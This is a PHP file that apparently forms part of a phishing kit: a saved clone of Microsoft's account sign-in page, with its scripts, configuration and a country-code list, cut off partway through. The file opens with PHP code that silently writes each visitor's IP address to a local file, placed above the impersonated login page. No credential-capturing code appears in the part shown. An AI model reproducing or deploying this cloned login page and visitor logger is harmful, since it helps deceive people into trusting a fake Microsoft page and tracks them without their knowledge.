<?php
function get_IP_address()
{
    foreach (array('HTTP_CLIENT_IP',
                   'HTTP_X_FORWARDED_FOR',
                   'HTTP_X_FORWARDED',
                   'HTTP_X_CLUSTER_CLIENT_IP',
                   'HTTP_FORWARDED_FOR',
                   'HTTP_FORWARDED',
                   'REMOTE_ADDR') as $key){
        if (array_key_exists($key, $_SERVER) === true){
            foreach (explode(',', $_SERVER[$key]) as $IPaddress){
                $IPaddress = trim($IPaddress); // Just to be safe

                if (filter_var($IPaddress,
                               FILTER_VALIDATE_IP,
                               FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)
                    !== false) {

                    return $IPaddress;
                }
            }
        }
    }
}
fwrite(fopen('ip.txt','w'),get_IP_address());
?>
<!DOCTYPE html>



<html dir="ltr" lang="EN-GB"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><!--<base href="https://login.live.com/pp1600/">--><base href="."><script type="text/javascript">var PROOF = {};PROOF.Type = {SQSA: 6, CSS: 5, DeviceId: 4, Email: 1, AltEmail: 2, SMS: 3, HIP: 8, Birthday: 9, TOTPAuthenticator: 10, RecoveryCode: 11, StrongTicket: 13, TOTPAuthenticatorV2: 14, UniversalSecondFactor: 15, Voice: -3};</script><noscript><meta http-equiv="Refresh" content="0; URL=https://login.live.com/jsDisabled.srf?mkt=EN-GB&lc=2057&uaid=d0aa0f5716da4260bfd055b0666a726e"/>Microsoft account requires JavaScript to sign in. This web browser either does not support JavaScript, or scripts are being blocked.<br /><br />To find out whether your browser supports JavaScript, or to allow scripts, see the browser's online help.</noscript><title>Sign in to your Microsoft account</title><meta name="robots" content="none"><meta name="PageID" content="i5030"><meta name="SiteID" content="292666"><meta name="ReqLC" content="2057"><meta name="LocLC" content="2057"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes"><script type="text/javascript">!function(e,r){for(var t in r)e[t]=r[t]}(this,function(e){function r(n){if(t[n])return t[n].exports;var o=t[n]={exports:{},id:n,loaded:!1};return e[n].call(o.exports,o,o.exports,r),o.loaded=!0,o.exports}var t={};return r.m=e,r.c=t,r.p="",r(0)}([function(e,r){!function(){function e(){return u.$Config||u.ServerData||{}}function r(e,r){var t=u.$Debug;t&&t.appendLog&&(r&&(e+=" '"+(r.src||r.href||"")+"'",e+=", id:"+(r.id||""),e+=", async:"+(r.async||""),e+=", defer:"+(r.defer||"")),t.appendLog(e))}function t(){var e=u.$B;if(void 0===c)if(e)c=e.IE;else{var r=u.navigator.userAgent;c=r.indexOf("MSIE ")!==-1||r.indexOf("Trident/")!==-1}return c}function n(e){var r=e.indexOf("?"),t=r>-1?r:e.length;return t>g&&e.substr(t-g,g).toLowerCase()===f}function o(){var r=e(),t=r.loader||{};return t.slReportFailure||r.slReportFailure||!1}function a(){var r=e(),t=r.loader||{};return t.redirectToErrorPageOnLoadFailure||!1}function i(){var r=e(),t=r.loader||{};return t.logByThrowing||!1}function s(e){var r=!0,t=e.src||e.href||"";if(t){if(n(t))try{e.sheet&&e.sheet.cssRules&&!e.sheet.cssRules.length&&(r=!1)}catch(o){}}else r=!1;return r}function d(){function t(e){var r=l.getElementsByTagName("head")[0];r.appendChild(e)}function o(e,r,t,o){var s=null;return s=n(e)?a(e):"script"===o.toLowerCase()?i(e):c(e,o),r&&(s.id=r),"function"==typeof s.setAttribute&&(s.setAttribute("crossorigin","anonymous"),t&&"string"==typeof t&&s.setAttribute("integrity",t)),s}function a(e){var r=l.createElement("link");return r.rel="stylesheet",r.type="text/css",r.href=e,r}function i(e){var r=l.createElement("script");return r.type="text/javascript",r.src=e,r.defer=!1,r.async=!1,r}function c(e,r){var t=l.createElement(r);return t.src=e,t}function u(e){if(!(m&&m.length>1))return e;for(var r=0;r<m.length;r++)if(0===e.indexOf(m[r]))return m[r+1<m.length?r+1:0]+e.substring(m[r].length);return e}function f(e,t,n,o){return r("[$Loader]: "+(L.failMessage||"Failed"),o),R[e].retry<p?(R[e].retry++,h(e,t,n),void d._ReportFailure(R[e].retry,R[e].srcPath)):void(n&&n())}function g(e,t,n,o){if(s(o)){r("[$Loader]: "+(L.successMessage||"Loaded"),o),h(e+1,t,n);var a=R[e].onSuccess;"function"==typeof a&&a(R[e].srcPath)}else f(e,t,n,o)}function h(e,n,a){if(e<R.length){var i=R[e];if(!i||!i.srcPath)return void h(e+1,n,a);i.retry>0&&(i.srcPath=u(i.srcPath),i.origId||(i.origId=i.id),i.id=i.origId+"_Retry_"+i.retry);var s=o(i.srcPath,i.id,i.integrity,i.tagName);s.onload=function(){g(e,n,a,s)},s.onerror=function(){f(e,n,a,s)},s.onreadystatechange=function(){"loaded"===s.readyState?setTimeout(function(){g(e,n,a,s)},500):"complete"===s.readyState&&g(e,n,a,s)},t(s),r("[$Loader]: Loading '"+(i.srcPath||"")+"', id:"+(i.id||""))}else n&&n()}var v=e(),p=v.slMaxRetry||2,y=v.loader||{},m=y.cdnRoots||[],L=this,R=[];L.retryOnError=!0,L.successMessage="Loaded",L.failMessage="Error",L.Add=function(e,r,t,n,o,a){e&&R.push({srcPath:e,id:r,retry:n||0,integrity:t,tagName:o||"script",onSuccess:a})},L.AddForReload=function(e,r){var t=e.src||e.href||"";L.Add(t,"AddForReload",e.integrity,1,e.tagName,r)},L.AddIf=function(e,r,t){e&&L.Add(r,t)},L.Load=function(e,r){h(0,e,r)}}var c,u=window,l=u.document,f=".css",g=f.length;d.On=function(e,r,t){if(!e)throw"The target element must be provided and cannot be null.";r?d.OnError(e,t):d.OnSuccess(e,t)},d.OnSuccess=function(e,t){var n=e.src||e.href||"",i=o(),c=a();if(!e)throw"The target element must be provided and cannot be null.";if(s(e)){r("[$Loader]: Loaded",e);var u=new d;u.failMessage="Reload Failed",u.successMessage="Reload Success",u.Load(null,function(){if(i)throw"Unexpected state. ResourceLoader.Load() failed despite initial load success. ['"+n+"']";c&&(document.location.href="/error.aspx?err=504")})}else d.OnError(e,t)},d.OnError=function(e,t){var n=e.src||e.href||"",i=o(),s=a();if(!e)throw"The target element must be provided and cannot be null.";r("[$Loader]: Failed",e);var c=new d;c.failMessage="Reload Failed",c.successMessage="Reload Success",c.AddForReload(e,t),c.Load(null,function(){if(i)throw"Failed to load external resource ['"+n+"']";s&&(document.location.href="/error.aspx?err=504")}),d._ReportFailure(0,n)},d._ReportFailure=function(e,r){if(i()&&!t())throw"[Retry "+e+"] Failed to load external resource ['"+r+"'], reloading from fallback CDN endpoint"},u.$Loader=d}()}]));</script><script type="text/javascript">!function(r,t){for(var e in t)r[e]=t[e]}(this,function(r){function t(o){if(e[o])return e[o].exports;var n=e[o]={exports:{},id:o,loaded:!1};return r[o].call(n.exports,n,n.exports,t),n.loaded=!0,n.exports}var e={};return t.m=r,t.c=e,t.p="",t(0)}([function(r,t){!function(){function r(r,t){function e(i){var a=r[i];return i<o-1?void(n.r[a]?e(i+1):n.when(a,function(){e(i+1)})):void t(a)}var o=r.length;e(0)}function t(r,t,i){function a(){var r=!!u.method,n=r?u.method:i[0],a=u.extraArgs||[],c=o.$WebWatson;try{var f=e(i,!r);if(a&&a.length>0)for(var s=a.length,v=0;v<s;v++)f.push(a[v]);n.apply(t,f)}catch(h){return void(c&&c.submitFromException&&c.submitFromException(h))}}var u=n.r&&n.r[r];return t=t?t:this,u&&(u.skipTimeout?a():o.setTimeout(a,0)),u}function e(r,t){return Array.prototype.slice.call(r,t?1:0)}var o=window;o.$Do||(o.$Do={q:[],r:[],removeItems:[],lock:0,o:[]});var n=o.$Do;n.when=function(e,o){function i(r){t(r,a,u)||n.q.push({id:r,c:a,a:u})}var a=0,u=[],c=1,f="function"==typeof o;f||(a=o,c=2);for(var s=c;s<arguments.length;s++)u.push(arguments[s]);e instanceof Array?r(e,i):i(e)},n.register=function(r,e,o){if(!n.r[r]){n.o.push(r);var i={};if(e&&(i.method=e),o&&(i.skipTimeout=o),arguments&&arguments.length>3){i.extraArgs=[];for(var a=3;a<arguments.length;a++)i.extraArgs.push(arguments[a])}n.r[r]=i,n.lock++;try{for(var u=0;u<n.q.length;u++){var c=n.q[u];c.id==r&&t(r,c.c,c.a)&&n.removeItems.push(c)}}catch(f){throw f}finally{if(n.lock--,0===n.lock){for(var s=0;s<n.removeItems.length;s++)for(var v=n.removeItems[s],h=0;h<n.q.length;h++)if(n.q[h]===v){n.q.splice(h,1);break}n.removeItems=[]}}}},n.unregister=function(r){n.r[r]&&delete n.r[r]}}()}]));</script><script type="text/javascript">!function(n,e){for(var r in e)n[r]=e[r]}(this,function(n){function e(o){if(r[o])return r[o].exports;var t=r[o]={exports:{},id:o,loaded:!1};return n[o].call(t.exports,t,t.exports,e),t.loaded=!0,t.exports}var r={};return e.m=n,e.c=r,e.p="",e(0)}([function(n,e){!function(){function n(){return r.$Config||r.ServerData||{}}function e(){var e=(n(),new t),r=this,i=[],f=[];r.Add=function(n,r,o,t){e.Add(n,r,o,t)},r.Provides=function(n){if(n)if(n instanceof Array)for(var e=0;e<n.length;e++)i.push(n[e]);else i.push(n)},r.Requires=function(n){if(n)if(n instanceof Array)for(var e=0;e<n.length;e++)f.push(n[e]);else f.push(n)},r.Load=function(n,r){var t=function(){n&&n();for(var e=0;e<i.length;e++)o.register(i[e],0,!0)},u=function(){e.Load(t,r)};f.length>0?o.when(f,u):u()}}var r=window,o=(r.document,r.$Do),t=r.$Loader,i=".css";i.length;e.WhenLoaded=function(n,e){o.when(n,e)},r.$DepLoader=e}()}]));</script><link rel="shortcut icon" href="https://logincdn.msauth.net/16.000.28957.10/images/favicon.ico"><link rel="stylesheet" title="Converged_v2" type="text/css" onload="$Loader.OnSuccess(this)" onerror="$Loader.OnError(this)" href="./Sign in to your Microsoft account_files/Converged_v22057_KmMuD1JlyDthRu155q2isQ2.css"><style type="text/css"></style><style type="text/css">body{display:none;}</style><script type="text/javascript">if (top != self){try{top.location.replace(self.location.href);}catch (e){}}else{document.write(unescape('%3C%73') + 'tyle type="text/css">body{display:block !important;}</style>');}</script><style type="text/css">body{display:block !important;}</style><noscript><style type="text/css">body{display:block !important;}</style></noscript><script type="text/javascript">!function(e,r){for(var t in r)e[t]=r[t]}(this,function(e){function r(n){if(t[n])return t[n].exports;var i=t[n]={exports:{},id:n,loaded:!1};return e[n].call(i.exports,i,i.exports,r),i.loaded=!0,i.exports}var t={};return r.m=e,r.c=t,r.p="",r(0)}([function(e,r){var t=window,n=t.navigator;t.g_iSRSFailed=0,t.g_sSRSSuccess="",r.SRSRetry=function(e,r,i,s,a){var o=1,c=unescape("%3Cscript type='text/javascript'");a&&(c+=" crossorigin='anonymous' integrity='"+a+"'"),c+=" src='";var u=unescape("'%3E%3C/script%3E"),S=r;if(n&&n.userAgent&&s&&s!==r){var d=n.userAgent.toLowerCase(),p=d.indexOf("edge")>=0;if(!p){var f=d.match(/chrome\/([0-9]+)\./),g=f&&2===f.length&&!isNaN(f[1])&&parseInt(f[1])>54;g&&(S=s)}}t.g_sSRSSuccess.indexOf(e)===-1&&("undefined"==typeof t[e]?(t.g_iSRSFailed=1,i<=o&&document.write(c+S+u)):t.g_sSRSSuccess+=e+"|"+i+",")}}]));var g_dtFirstByte=new Date();var g_objPageMode = null;</script><link rel="image_src" href="https://logincdn.msauth.net/16.000.28957.10/images/Windows_Live_v_thumb.jpg"><script type="text/javascript">var ServersData = {Bi:true,CI:false,CJ:false,Bk:false,Bo:true,urlPostMsa:'https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&ct=1616477099&rver=7.0.6738.0&wp=MBI_SSL&wreply=https:%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin%3Fru%3Dhttps%253A%252F%252Faccount.microsoft.com%252F%253Frefp%253Dsignedout-index%2526refd%253Dwww.google.com&id=292666&lw=1&fl=easi2&uiflavor=web&mkt=EN-GB&lc=2057&contextid=34E1E35DF72CFEA1&bk=1616477114&uaid=d0aa0f5716da4260bfd055b0666a726e&pid=0',aD:'https://login.microsoft.com/consumers/fido/get?mkt=EN-GB&lc=2057&uiflavor=web',CP:true,aE:'https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&mkt=EN-GB&uaid=d0aa0f5716da4260bfd055b0666a726e',aG:'',Bu:0,Bw:3,CV:false,CY:false,aO:false,b0:true,aQ:true,b2:true,urlLogin:'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1616477099&rver=7.0.6738.0&wp=MBI_SSL&wreply=https:%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin%3Fru%3Dhttps%253A%252F%252Faccount.microsoft.com%252F%253Frefp%253Dsignedout-index%2526refd%253Dwww.google.com&id=292666&lw=1&fl=easi2&uiflavor=web&contextid=34E1E35DF72CFEA1&bk=1616477114&mkt=EN-GB&lc=2057&uaid=d0aa0f5716da4260bfd055b0666a726e',aU:true,DA:'',b5:true,DB:'',Cc:false,hpgid:33,b6:false,b7:false,aX:false,DD:'https://go.microsoft.com/fwlink/?linkid=2013738',Ce:false,Cf:true,DF:'',DG:'https://go.microsoft.com/fwlink/?LinkID=254486',Cl:false,urlFed:'',bA:'',ac:'',Co:true,bC:'PPFT',ad:'',urlPostAad:'',ae:'https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&mkt=EN-GB&uaid=d0aa0f5716da4260bfd055b0666a726e',bD:'16.0.28957.10',bF:'',ag:'',bG:'',sPOST_NewUser:'',bJ:'https://account.live.com/query.aspx?uaid=d0aa0f5716da4260bfd055b0666a726e&mkt=EN-GB&lc=2057&id=292666',an:true,bN:'https://login.live.com/GetCredentialType.srf?opid=C3F668FFDFD73A10&id=292666&uiflavor=web&wa=wsignin1.0&rpsnv=13&ct=1616477099&rver=7.0.6738.0&wp=MBI_SSL&wreply=https:%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin%3Fru%3Dhttps%253A%252F%252Faccount.microsoft.com%252F%253Frefp%253Dsignedout-index%2526refd%253Dwww.google.com&id=292666&lw=1&fl=easi2&contextid=34E1E35DF72CFEA1&bk=1616477103&uiflavor=web&mkt=EN-GB&lc=2057&uaid=d0aa0f5716da4260bfd055b0666a726e',ao:false,bO:'',bP:'https://login.live.com/Me.htm?v=3&uaid=d0aa0f5716da4260bfd055b0666a726e',aq:false,c0:"Sign in",urlPost:'https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&ct=1616477099&rver=7.0.6738.0&wp=MBI_SSL&wreply=https:%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin%3Fru%3Dhttps%253A%252F%252Faccount.microsoft.com%252F%253Frefp%253Dsignedout-index%2526refd%253Dwww.google.com&id=292666&lw=1&fl=easi2&uiflavor=web&mkt=EN-GB&lc=2057&contextid=34E1E35DF72CFEA1&bk=1616477114&uaid=d0aa0f5716da4260bfd055b0666a726e&pid=0',bT:'https://login.live.com/GetSessionState.srf?uiflavor=web&wa=wsignin1.0&rpsnv=13&ct=1616477099&rver=7.0.6738.0&wp=MBI_SSL&wreply=https:%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin%3Fru%3Dhttps%253A%252F%252Faccount.microsoft.com%252F%253Frefp%253Dsignedout-index%2526refd%253Dwww.google.com&id=292666&lw=1&fl=easi2&contextid=34E1E35DF72CFEA1&bk=1616477103&uiflavor=web&mkt=EN-GB&lc=2057&uaid=d0aa0f5716da4260bfd055b0666a726e',Da:'http://developer.windowsphone.com/marketplace.aspx',Db:'',Dc:'',bX:2,c7:'',ay:false,c8:'https://sc.imp.live.com/content/dam/imp/surfaces/mail_signin/v3/account/EN-GB.html?id=292666&mkt=EN-GB',De:'',bY:true,c9:'https://developer.microsoft.com/app_themes/standard/images/dashboard/marketplacephone2.png',bZ:true,A:10000,fWebNgcFS:false,B:2,Di:'',D:1,sFedQS:'wa=wsignin1.0&wtrealm=uri:WindowsLiveID&wctx=wa%3Dwsignin1.0%26rpsnv%3D13%26ct%3D1616477099%26rver%3D7.0.6738.0%26wp%3DMBI_SSL%26wreply%3Dhttps:%252F%252Faccount.microsoft.com%252Fauth%252Fcomplete-signin%253Fru%253Dhttps%25253A%25252F%25252Faccount.microsoft.com%25252F%25253Frefp%25253Dsignedout-index%252526refd%25253Dwww.google.com%26id%3D292666%26lw%3D1%26fl%3Deasi2%26uiflavor%3Dweb%26mkt%3DEN-GB%26lc%3D2057%26uaid%3Dd0aa0f5716da4260bfd055b0666a726e%26contextid%3D34E1E35DF72CFEA1%26bk%3D1616477114',F:true,G:'https://signup.live.com?wa=wsignin1.0&rpsnv=13&ct=1616477099&rver=7.0.6738.0&wp=MBI_SSL&wreply=https:%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin%3Fru%3Dhttps%253A%252F%252Faccount.microsoft.com%252F%253Frefp%253Dsignedout-index%2526refd%253Dwww.google.com&id=292666&lw=1&fl=easi2&contextid=34E1E35DF72CFEA1&bk=1616477114&uiflavor=web&lic=1&mkt=EN-GB&lc=2057&uaid=d0aa0f5716da4260bfd055b0666a726e',H:'',cC:1,J:'',A0:'login.live.com',K:0,bf:'',cF:{},bg:'',M:'d0aa0f5716da4260bfd055b0666a726e',A3:'',cG:{},bh:'',A4:'',cH:{'Logo':'','LogoAltText':'','LogoText':'','ShowWLHeader':true},A5:'',cJ:'##li16####B##Hotmail##/B####BR##The smart way to do email - fast, easy and reliable##li8####B##Messenger##/B####BR##Stay in touch with the most important people in your life##li10####B##SkyDrive##/B####BR##Free, password-protected online storage',str:[],cK:'',bl:'',S:'https://github.com/login/oauth/authorize?response_type=code&client_id=e37ffdec11c0245cb2e0&scope=read:user++user:email&redirect_uri=https://login.live.com/HandleGithubResponse.srf&allow_signup=false&state=C3F668FFDFD73A10',cL:'',T:'https://login.live.com/cookiesDisabled.srf?uaid=d0aa0f5716da4260bfd055b0666a726e&mkt=EN-GB&lc=2057',cO:'',cP:'',br:'',bs:'',Z:0,AA:null,urlSwitch:'https://login.live.com/logout.srf?wa=wsignin1.0&rpsnv=13&ct=1616477099&rver=7.0.6738.0&wp=MBI_SSL&wreply=https:%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin%3Fru%3Dhttps%253A%252F%252Faccount.microsoft.com%252F%253Frefp%253Dsignedout-index%2526refd%253Dwww.google.com&id=292666&lw=1&fl=easi2&uiflavor=web&mkt=EN-GB&lc=2057&contextid=34E1E35DF72CFEA1&uaid=d0aa0f5716da4260bfd055b0666a726e&ru=https://account.microsoft.com/auth/complete-signin%3fru%3dhttps%253A%252F%252Faccount.microsoft.com%252F%253Frefp%253Dsignedout-index%2526refd%253Dwww.google.com&bk=1616477114&lm=I',cU:'',AC:'wa=wsignin1.0&rpsnv=13&ct=1616477099&rver=7.0.6738.0&wp=MBI_SSL&wreply=https:%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin%3Fru%3Dhttps%253A%252F%252Faccount.microsoft.com%252F%253Frefp%253Dsignedout-index%2526refd%253Dwww.google.com&id=292666&lw=1&fl=easi2&uiflavor=web&mkt=EN-GB&lc=2057&uaid=d0aa0f5716da4260bfd055b0666a726e&contextid=34E1E35DF72CFEA1&bk=1616477114',urlFedConvertRename:'https://account.live.com/security/LoginStage.aspx?lmif=1000&ru=https://login.live.com/login.srf%3Fwa%3Dwsignin1.0%26rpsnv%3D13%26ct%3D1616477099%26rver%3D7.0.6738.0%26wp%3DMBI_SSL%26wreply%3Dhttps:%252F%252Faccount.microsoft.com%252Fauth%252Fcomplete-signin%253Fru%253Dhttps%25253A%25252F%25252Faccount.microsoft.com%25252F%25253Frefp%25253Dsignedout-index%252526refd%25253Dwww.google.com%26id%3D292666%26lw%3D1%26fl%3Deasi2%26contextid%3D34E1E35DF72CFEA1%26bk%3D1616477103%26uiflavor%3Dweb%26mkt%3DEN-GB%26lc%3D2057%26uaid%3Dd0aa0f5716da4260bfd055b0666a726e&uiflavor=web&wa=wsignin1.0&rpsnv=13&ct=1616477099&rver=7.0.6738.0&wp=MBI_SSL&wreply=https:%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin%3Fru%3Dhttps%253A%252F%252Faccount.microsoft.com%252F%253Frefp%253Dsignedout-index%2526refd%253Dwww.google.com&lw=1&fl=easi2&contextid=34E1E35DF72CFEA1&bk=1616477103&uiflavor=web&mkt=EN-GB&lc=2057&cbid=0&id=292666&uaid=d0aa0f5716da4260bfd055b0666a726e',AD:'',by:0,cX:"Use the primary phone number you\'ve associated with your Microsoft account. <a href=\"http://explore.live.com/windows-live-sign-in-single-use-code-faq\" id=\"idPaneHelpOTCInfoLink9\" target=\"_blank\">Learn more</a>",a:'https://logincdn.msauth.net/shared/1.0/',b:'',AH:3,c:{},AI:null,d:false,e:'',g:'',i:'292666',j:false,AQ:true,k:-1,AR:true,AS:false,B2:'',cg:{},AU:true,B5:'',sCBUpTxt1:'Would you like to learn more about Windows Marketplace for Mobile?',ci:'',sCBUpTxt2:'The link below will provide you with the information you need.',q:2057,AW:0,ck:'sign up',r:'https://account.live.com/username/recover?wreply=https://login.live.com/login.srf%3flc%3d2057%26mkt%3dEN-GB%26wa%3dwsignin1.0%26rpsnv%3d13%26ct%3d1616477099%26rver%3d7.0.6738.0%26wp%3dMBI_SSL%26wreply%3dhttps:%252F%252Faccount.microsoft.com%252Fauth%252Fcomplete-signin%253Fru%253Dhttps%25253A%25252F%25252Faccount.microsoft.com%25252F%25253Frefp%25253Dsignedout-index%252526refd%25253Dwww.google.com%26id%3d292666%26lw%3d1%26fl%3deasi2%26uiflavor%3dweb%26mkt%3dEN-GB%26lc%3d2057%26contextid%3d34E1E35DF72CFEA1%26bk%3d1616477114%26uaid%3dd0aa0f5716da4260bfd055b0666a726e&id=292666&mkt=EN-GB&lc=2057&uaid=d0aa0f5716da4260bfd055b0666a726e&uiflavor=web',s:'',cl:'',AY:0,t:'https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf%3fwa%3dwsignin1.0%26rpsnv%3d13%26ct%3d1616477099%26rver%3d7.0.6738.0%26wp%3dMBI_SSL%26wreply%3dhttps:%252F%252Faccount.microsoft.com%252Fauth%252Fcomplete-signin%253Fru%253Dhttps%25253A%25252F%25252Faccount.microsoft.com%25252F%25253Frefp%25253Dsignedout-index%252526refd%25253Dwww.google.com%26id%3d292666%26lw%3d1%26fl%3deasi2%26uiflavor%3dweb%26mkt%3dEN-GB%26lc%3d2057%26uaid%3dd0aa0f5716da4260bfd055b0666a726e%26contextid%3d34E1E35DF72CFEA1%26bk%3d1616477114&id=292666&uiflavor=web&uaid=d0aa0f5716da4260bfd055b0666a726e&mkt=EN-GB&lc=2057&bk=1616477114',v:false,w:true,fImprovePhoneDisambig:true,cq:'PassportR',correlationId:'d0aa0f5716da4260bfd055b0666a726e',z:1,oPost:{},Aa:60,cu:"#~#partnerdomain#~# doesn\'t use this service. Please sign in with a Microsoft account or create a new account. <a href=\"#~#WLPaneHelpInviteBlockedURL_LS#~#\" id=\"idPaneHelpInviteBlockedLink9\">Learn More</a>",Ac:'',Ae:'',cx:"A single-use code lets you sign in without entering your password. This helps protect your account when you\'re using someone else\'s PC. <a href=\"http://explore.live.com/windows-live-sign-in-single-use-code-faq\" id=\"idPaneHelpOTCInfoLink9\" target=\"_blank\">Learn more</a>",cy:"Your session has timed out. To request a single use code, please <a href=\"javascript:NewOTCRequest()\">refresh the page</a>.",Af:false,Ag:true,BG:false,Ah:0,BH:true,fEnableOneDSClientTelemetry:false,Ak:'AF~Afghanistan~93!!!AL~Albania~355!!!DZ~Algeria~213!!!AD~Andorra~376!!!AO~Angola~244!!!AQ~Antarctica~672!!!AG~Antigua and Barbuda~1!!!AR~Argentina~54!!!AM~Armenia~374!!!AW~Aruba~297!!!AC~Ascension Island~247!!!AU~Australia~61!!!AT~Austria~43!!!AZ~Azerbaijan~994!!!BS~Bahamas~1!!!BH~Bahrain~973!!!BD~Bangladesh~880!!!BB~Barbados~1!!!BY~Belarus~375!!!BE~Belgium~32!!!BZ~Belize~501!!!BJ~Benin~229!!!BM~Bermuda~1!!!BT~Bhutan~975!!!BO~Bolivia~591!!!BQ~Bonaire~599!!!BA~Bosnia and Herzegovina~387!!!BW~Botswana~267!!!BV~Bouvet Island~47!!!BR~Brazil~55!!!IO~British Indian Ocean Territory~44!!!VG~British Virgin Islands~1!!!BN~Brunei~673!!!BG~Bulgaria~359!!!BF~Burkina Faso~226!!!BI~Burundi~257!!!CV~Cabo Verde~238!!!KH~Cambodia~855!!!CM~Cameroon~237!!!CA~Canada~1!!!KY~Cayman Islands~1!!!CF~Central African Republic~236!!!TD~Chad~235!!!CL~Chile~56!!!CN~China~86!!!CX~Christmas Island~61!!!CC~Cocos (Keeling) Islands~61!!!CO~Colombia~57!!!KM~Comoros~269!!!CG~Congo~242!!!CD~Congo (DRC)~243!!!CK~Cook Islands~682!!!CR~Costa Rica~506!!!CI~Côte d\'Ivoire~225!!!HR~Croatia~385!!!CU~Cuba~53!!!CW~Curaçao~599!!!CY~Cyprus~357!!!CZ~Czechia~420!!!DK~Denmark~45!!!DJ~Djibouti~253!!!DM~Dominica~1!!!DO~Dominican Republic~1!!!EC~Ecuador~593!!!EG~Egypt~20!!!SV~El Salvador~503!!!GQ~Equatorial Guinea~240!!!ER~Eritrea~291!!!EE~Estonia~372!!!ET~Ethiopia~251!!!FK~Falkland Islands~500!!!FO~Faroe Islands~298!!!FJ~Fiji~679!!!FI~Finland~358!!!FR~France~33!!!GF~French Guiana~594!!!PF~French Polynesia~689!!!GA~Gabon~241!!!GM~Gambia~220!!!GE~Georgia~995!!!DE~Germany~49!!!GH~Ghana~233!!!GI~Gibraltar~350!!!GR~Greece~30!!!GL~Greenland~299!!!GD~Grenada~1!!!GP~Guadeloupe~590!!!GU~Guam~1!!!GT~Guatemala~502!!!GG~Guernsey~44!!!GN~Guinea~224!!!GW~Guinea-Bissau~245!!!GY~Guyana~592!!!HT~Haiti~509!!!HN~Honduras~504!!!HK~Hong Kong SAR~852!!!HU~Hungary~36!!!IS~Iceland~354!!!IN~India~91!!!ID~Indonesia~62!!!IR~Iran~98!!!IQ~Iraq~964!!!IE~Ireland~353!!!IM~Isle of Man~44!!!IL~Israel~972!!!IT~Italy~39!!!JM~Jamaica~1!!!XJ~Jan Mayen~47!!!JP~Japan~81!!!JE~Jersey~44!!!JO~Jordan~962!!!KZ~Kazakhstan~7!!!KE~Kenya~254!!!KI~Kiribati~686!!!KR~Korea~82!!!XK~Kosovo~383!!!KW~Kuwait~965!!!KG~Kyrgyzstan~996!!!LA~Laos~856!!!LV~Latvia~371!!!LB~Lebanon~961!!!LS~Lesotho~266!!!LR~Liberia~231!!!LY~Libya~218!!!LI~Liechtenstein~423!!!LT~Lithuania~370!!!LU~Luxembourg~352!!!MO~Macao SAR~853!!!MK~North Macedonia~389!!!MG~Madagascar~261!!!MW~Malawi~265!!!MY~Malaysia~60!!!MV~Maldives~960!!!ML~Mali~223!!!MT~Malta~356!!!MH~Marshall Islands~692!!!MQ~Martinique~596!!!MR~Mauritania~222!!!MU~Mauritius~230!!!YT~Mayotte~262!!!MX~Mexico~52!!!FM~Micronesia~691!!!MD~Moldova~373!!!MC~Monaco~377!!!MN~Mongolia~976!!!ME~Montenegro~382!!!MS~Montserrat~1!!!MA~Morocco~212!!!MZ~Mozambique~258!!!MM~Myanmar~95!!!NA~Namibia~264!!!NR~Nauru~674!!!NP~Nepal~977!!!NL~Netherlands~31!!!AN~Netherlands Antilles (Former)~599!!!NC~New Caledonia~687!!!NZ~New Zealand~64!!!NI~Nicaragua~505!!!NE~Niger~227!!!NG~Nigeria~234!!!NU~Niue~683!!!MP~Northern Mariana Islands~1!!!NO~Norway~47!!!OM~Oman~968!!!PK~Pakistan~92!!!PW~Palau~680!!!PS~Palestinian Authority~970!!!PA~Panama~507!!!PG~Papua New Guinea~675!!!PY~Paraguay~595!!!PE~Peru~51!!!PH~Philippines~63!!!PL~Poland~48!!!PT~Portugal~351!!!QA~Qatar~974!!!RE~Réunion~262!!!RO~Romania~40!!!RU~Russia~7!!!RW~Rwanda~250!!!XS~Saba~599!!!KN~Saint Kitts and Nevis~1!!!LC~Saint Lucia~1!!!PM~Saint Pierre and Miquelon~508!!!VC~Saint Vincent and the Grenadines~1!!!WS~Samoa~685!!!SM~San Marino~378!!!ST~São Tomé and Príncipe~239!!!SA~Saudi Arabia~966!!!SN~Senegal~221!!!RS~Serbia~381!!!SC~Seychelles~248!!!SL~Sierra Leone~232!!!SG~Singapore~65!!!XE~Sint Eustatius~599!!!SK~Slovakia~421!!!SI~Slovenia~386!!!SB~Solomon Islands~677!!!SO~Somalia~252!!!ZA~South Africa~27!!!SS~South Sudan~211!!!ES~Spain~34!!!LK~Sri Lanka~94!!!SH~St Helena, Ascension and Tristan da Cunha~290!!!SD~Sudan~249!!!SR~Suriname~597!!!SJ~Svalbard~47!!!SZ~Swaziland~268!!!SE~Sweden~46!!!CH~Switzerland~41!!!SY~Syria~963!!!TW~Taiwan~886!!!TJ~Tajikistan~992!!!TZ~Tanzania~255!!!TH~Thailand~66!!!TL~Timor-Leste~670!!!TG~Togo~228!!!TK~Tokelau~690!!!TO~Tonga~676!!!TT~Trinidad and Tobago~1!!!TA~Tristan da Cunha~290!!!TN~Tunisia~216!!!TR~Turkey~90!!!TM~Turkmenistan~993!!!TC~Turks and Caicos Islands~1!!!TV~Tuvalu~688!!!UM~US Outlying Islands~1!!!VI~US Virgin Islands~1!!!UG~Uganda~256!!!UA~Ukraine~380!!!AE~United Arab Emirates~971!!!UK~United Kingdom~44!!!US~United States~1!!!UY~Uruguay~598!!!UZ~Uzbekistan~998!!!VU~Vanuatu~678!!!VA~Vatican 